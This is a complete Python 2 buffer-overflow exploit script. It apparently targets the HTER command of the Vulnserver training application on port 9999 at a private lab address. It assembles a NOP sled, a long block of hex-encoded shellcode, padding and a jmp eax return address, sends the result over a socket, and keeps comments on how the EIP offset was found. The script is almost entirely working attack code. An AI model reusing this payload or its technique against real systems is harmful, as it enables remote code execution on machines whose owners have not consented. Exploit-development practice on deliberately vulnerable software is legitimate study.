#!/usr/bin/env python
#Tested on Vista Enterprise SP2 32-bit and Windows 7 Professional SP1 32-bit

import socket
import time

NOPS = "90" * 16
SHELL = ("505cbb682becfedbdbd97424f45831c9b15283c00431580e0330250e0b3cd14cf4bc22317c5913711a2a0441687ea92a3c6a3a5ee99d8bd5cf900c4533b38e946013ae567552f78b7406a0c02bb6c59df73d953070a26e325175e46d71742906386e2e23f20584df05cfd420a92ed9d2b377de0cc6811cb0d1565e6e574cf8e5cfa8f82a893bf687dd631b1931182792b4cea1e092caeab3bb4b5715c38b38ca61c0d51f188bb1ec1133427b2140702499ce38ad07093e84f085c127018c057351a6acfc3a365029ec66fe824dd6be72263c31ac563f9bc5fdba4c2aa9ce0fc2a8ce0ea824287ade60e31347297f8588e7fa850304fb48e461ef3d043c4deb1beaf9778971f9feb22dae5704243a4a3f9e5897d9d9d84c1ae7e10126c3f1dfa74fa58ff1191376a8ebcd2007a299b56b75dfb9a1033f0b1c5240a4c85239d8689c905898d7b8c931be29485c41848f59c22c709eda4575da5cb6077309b8b47418")

IP = '192.168.10.136'
PORT = 9999
BUFFER_SIZE = 1024

#0x625011b1 jmp eax
buffer = "HTER 0" + NOPS + SHELL + "A" * (2040 - len(SHELL) - len(NOPS))  + "b1115062" + "C" * 2952 

#Used to pinpoint EIP. Our buffer is stored in hex bytes oppose to ASCII.
#"1" * 200 + "2" * 200 + "3" * 200 + "4" * 200 + "5" * 200 + "6" * 200 + "7" * 200 + "8" * 200 + "9" * 200 + "A" * 200 + "B" * 200 + "C" * 200 + "D" * 200 + "E" * 200 + "F" * 200
#"1" * 20 + "2" * 20 + "3" * 20 + "4" * 20 + "5" * 20 + "6" * 20 + "7" * 20 + "8" * 20 + "9" * 20 + "A" * 20 + "B" * 20 + "C" * 20 + "D" * 20 + "E" * 20 + "F" * 20 
#"1" * 2 + "2" * 2 + "3" * 2 + "4" * 2 + "5" * 2 + "6" * 2 + "7" * 2 + "8" * 2 + "9" * 2 + "A" * 2 + "B" * 2 + "C" * 2 + "D" * 2 + "E" * 2 + "F" * 2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
time.sleep(2)
s.send(buffer)
data = s.recv(BUFFER_SIZE)
s.close()
print "received data:", data
